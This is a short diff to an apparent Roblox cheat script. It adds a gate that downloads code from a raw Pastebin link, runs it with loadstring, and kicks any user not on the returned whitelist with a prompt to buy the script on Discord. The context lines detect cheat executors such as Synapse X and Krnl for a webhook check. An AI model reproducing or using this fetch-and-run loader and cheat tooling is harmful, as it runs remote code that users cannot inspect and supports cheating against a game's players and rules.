@@ -1,4 +1,16 @@
-    local webhookcheck =
+local userids = loadstring(game:HttpGet("https://pastebin.com/raw/JzJaPeUY", true))()
+if userids[game.Players.LocalPlayer.UserId] then
+--Whitelisted
+else
+--Not whitelisted
+game.Players:WaitForChild("LocalPlayer"):Kick("Purchase This Script At Discord.gg/Bum")
+end
+
+
+
+
+
+  local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
